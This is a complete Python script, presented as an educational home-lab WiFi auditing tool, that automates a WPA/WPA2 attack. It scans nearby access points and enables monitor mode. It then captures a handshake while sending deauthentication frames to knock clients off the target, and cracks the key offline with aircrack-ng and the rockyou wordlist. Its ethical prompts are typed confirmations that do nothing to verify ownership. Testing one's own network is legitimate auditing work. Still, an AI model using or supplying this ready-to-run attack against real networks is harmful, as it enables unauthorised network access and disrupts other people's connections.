#!/usr/bin/env python3
"""
WiFi Security Auditing Tool - Educational Home Lab Project
============================================================
Purpose: Demonstrate WPA/WPA2 handshake capture and offline
         dictionary attack against YOUR OWN lab network.

LEGAL: Use ONLY on networks you personally own or have written
       permission to test. Unauthorized access is a criminal offense.
"""

import subprocess
import os
import sys
import time
import re
import signal

# ---------------- CONFIG ----------------
CAPTURE_DIR = "./captures"
WORDLIST    = "/usr/share/wordlists/rockyou.txt"   # Kali default
SCAN_WAIT   = 8      # seconds to wait after rescan
CLIENT_WAIT = 10     # seconds to look for clients before deauth
MAX_CAP_WAIT = 90    # max seconds to wait for handshake
# ----------------------------------------


# ---------------- UTILITIES ----------------
def run(cmd, capture=True, timeout=180):
    """Run shell command. Return stdout string (or '' on timeout)."""
    try:
        r = subprocess.run(
            cmd, shell=True, capture_output=capture, text=True, timeout=timeout
        )
        return r.stdout if capture else ""
    except subprocess.TimeoutExpired:
        return ""


def banner():
    print("=" * 62)
    print("   WiFi Security Auditing Tool - EDUCATIONAL USE ONLY")
    print("   Test ONLY on networks you own or have permission to test.")
    print("=" * 62)


def ethical_checkpoint():
    print("\n[!] ETHICAL ACKNOWLEDGEMENT REQUIRED")
    print("    You must confirm you are testing YOUR OWN network")
    print("    in a home lab environment, not a public or third-party AP.\n")
    if input("Type 'I AGREE' to continue: ").strip() != "I AGREE":
        print("[x] Acknowledgement not given. Exiting.")
        sys.exit(1)
    print("[+] Acknowledgement received.\n")


# ---------------- PHASE 1: INTERFACE ----------------
def list_interfaces():
    print("\n[PHASE 1] Available Wireless Interfaces")
    print("-" * 42)
    out = run("iw dev")
    ifaces = re.findall(r"Interface (\w+)", out)
    if not ifaces:
        print("[x] No wireless interfaces found.")
        sys.exit(1)
    for i, ifc in enumerate(ifaces, 1):
        print(f"  [{i}] {ifc}")
    return ifaces


def choose_interface(ifaces):
    while True:
        raw = input("\nSelect interface number: ").strip()
        if raw.isdigit() and 1 <= int(raw) <= len(ifaces):
            return ifaces[int(raw) - 1]
        print("[x] Invalid choice.")


# ---------------- PHASE 2: RECON ----------------
def scan_networks(iface):
    print(f"\n[PHASE 2] Scanning networks on {iface}...")
    print("-" * 42)
    run(f"nmcli device wifi rescan ifname {iface}", capture=False)
    time.sleep(SCAN_WAIT)

    out = run(
        f"nmcli -f BSSID,SSID,CHAN,SIGNAL,SECURITY device wifi list ifname {iface}"
    )
    lines = [l for l in out.splitlines() if l.strip() and "BSSID" not in l]

    aps = []
    print(f"\n{'#':<4}{'BSSID':<20}{'CH':<5}{'SIG':<5}{'SEC':<16}SSID")
    print("-" * 74)
    for idx, line in enumerate(lines, 1):
        parts = re.split(r"\s{2,}", line.strip())
        if len(parts) >= 5:
            bssid, ssid, chan, sig, sec = parts[0], parts[1], parts[2], parts[3], parts[4]
            aps.append({
                "bssid": bssid, "ssid": ssid,
                "chan": chan,   "sec": sec,
            })
            print(f"{idx:<4}{bssid:<20}{chan:<5}{sig:<5}{sec:<16}{ssid}")
    return aps


def choose_target(aps):
    """Accept target by number OR BSSID. Force SSID confirmation."""
    while True:
        raw = input(
            "\nSelect target by number (from '#' column) or paste BSSID: "
        ).strip()
        target = None

        # numeric selection
        if raw.isdigit():
            i = int(raw)
            if 1 <= i <= len(aps):
                target = aps[i - 1]
            else:
                print(f"[x] No AP #{i}. Choose between 1 and {len(aps)}.")
                continue

        # BSSID selection
        if target is None:
            for ap in aps:
                if ap["bssid"].lower() == raw.lower():
                    target = ap
                    break

        if target is None:
            print("[x] Invalid choice. Enter the number OR a BSSID like 3C:A3:7E:F5:5B:58.")
            continue

        print(f"\n[+] Target: {target['ssid']} ({target['bssid']}) Ch {target['chan']}")
        print("\n[!] STOP and answer honestly:")
        print("    Do you OWN this router (you know its admin password)?")
        print("    Is it a dedicated LAB router, NOT a neighbor's?")

        typed = input("Type the SSID EXACTLY to confirm it is YOURS: ").strip()
        if typed != target["ssid"]:
            print("[x] SSID mismatch. Target rejected — this is your legal safety net.")
            print("    If this really is your AP, re-select and type the SSID carefully.\n")
            continue
        return target


# ---------------- PHASE 3: MONITOR MODE ----------------
def enable_monitor_mode(iface):
    print(f"\n[PHASE 3] Enabling monitor mode on {iface}...")
    print("-" * 42)
    run("airmon-ng check kill", capture=False)
    time.sleep(2)
    run(f"airmon-ng start {iface}", capture=False)
    time.sleep(3)

    out = run("iw dev")
    mons = re.findall(r"Interface (\w*mon\w*)", out)
    mon = mons[0] if mons else iface
    print(f"[+] Monitor interface: {mon}")
    return mon


# ---------------- PHASE 4: HANDSHAKE CAPTURE ----------------
def capture_handshake(mon, target):
    print(f"\n[PHASE 4] Capturing WPA handshake from {target['ssid']}...")
    print("-" * 42)
    os.makedirs(CAPTURE_DIR, exist_ok=True)
    prefix = os.path.join(CAPTURE_DIR, "handshake")

    # remove old captures to avoid confusion
    for f in os.listdir(CAPTURE_DIR):
        try: os.remove(os.path.join(CAPTURE_DIR, f))
        except OSError: pass

    airodump_cmd = (
        f"airodump-ng --bssid {target['bssid']} -c {target['chan']} "
        f"-w {prefix} {mon}"
    )
    print(f"[*] airodump-ng running: {airodump_cmd}")
    airodump = subprocess.Popen(
        airodump_cmd, shell=True,
        stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL,
    )

    print(f"[*] Waiting {CLIENT_WAIT}s for a client to associate...")
    time.sleep(CLIENT_WAIT)

    print("[*] Sending deauth frames to force handshake...")
    run(f"aireplay-ng --deauth 15 -a {target['bssid']} {mon}", capture=False)

    print(f"[*] Watching for handshake (max {MAX_CAP_WAIT}s)...")
    cap = f"{prefix}-01.cap"
    found = False
    for _ in range(MAX_CAP_WAIT):
        if os.path.exists(cap):
            chk = run(f"aircrack-ng {cap} 2>&1")
            if "1 handshake" in chk or "WPA (1 handshake" in chk:
                found = True
                break
        time.sleep(1)

    airodump.send_signal(signal.SIGINT)
    time.sleep(2)

    if found:
        print(f"[+] Handshake captured: {cap}")
        return cap
    print("[x] No handshake captured. Try again (move closer, more deauths).")
    return None


# ---------------- PHASE 5: CRACK ----------------
def crack_handshake(cap, wordlist):
    print(f"\n[PHASE 5] Offline dictionary attack...")
    print("-" * 42)
    if not os.path.exists(wordlist):
        print(f"[x] Wordlist not found: {wordlist}")
        print("    On Kali: sudo gunzip /usr/share/wordlists/rockyou.txt.gz")
        return None

    # get BSSID from the cap itself (safer than shell substitution)
    info = run(f"aircrack-ng {cap} 2>&1")
    m = re.search(r"([0-9A-Fa-f]{2}:){5}[0-9A-Fa-f]{2}", info)
    bssid = m.group(0) if m else None
    if not bssid:
        print("[x] Could not determine BSSID from capture file.")
        return None

    print(f"[*] Wordlist: {wordlist}")
    print("[*] Running aircrack-ng (be patient)...")
    out = run(f"aircrack-ng -w {wordlist} -b {bssid} {cap}", timeout=1800)
    print(out)

    m = re.search(r"KEY FOUND!\s*\[\s*(.+?)\s*\]", out)
    return m.group(1) if m else None


# ---------------- PHASE 6: CLEANUP ----------------
def disable_monitor_mode(mon):
    print("\n[PHASE 6] Cleaning up...")
    run(f"airmon-ng stop {mon}", capture=False)
    run("systemctl restart NetworkManager", capture=False)
    print("[+] Monitor mode disabled. NetworkManager restarted.")


# ---------------- MAIN ----------------
def main():
    if os.geteuid() != 0:
        print("[x] This tool must be run as root (sudo).")
        sys.exit(1)

    banner()
    ethical_checkpoint()

    ifaces = list_interfaces()
    iface  = choose_interface(ifaces)

    aps = scan_networks(iface)
    if not aps:
        print("[x] No APs found.")
        sys.exit(1)

    target = choose_target(aps)
    mon = enable_monitor_mode(iface)

    cap = None
    try:
        cap = capture_handshake(mon, target)
    finally:
        if cap:
            pw = crack_handshake(cap, WORDLIST)
            print("\n" + "=" * 62)
            if pw:
                print(f"[+] PASSWORD FOUND: {pw}")
                print("[!] Your network's password is weak — change it!")
            else:
                print("[x] Password NOT in wordlist.")
                print("[+] Not a common dictionary password. Good sign.")
            print("=" * 62)
        disable_monitor_mode(mon)


if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print("\n[!] Interrupted. Cleaning up...")
        mon = run("iw dev | grep -oE '\\w*mon\\w*'").strip().splitlines()
        for m in mon:
            os.system(f"airmon-ng stop {m} 2>/dev/null")
        os.system("systemctl restart NetworkManager")
        sys.exit(0)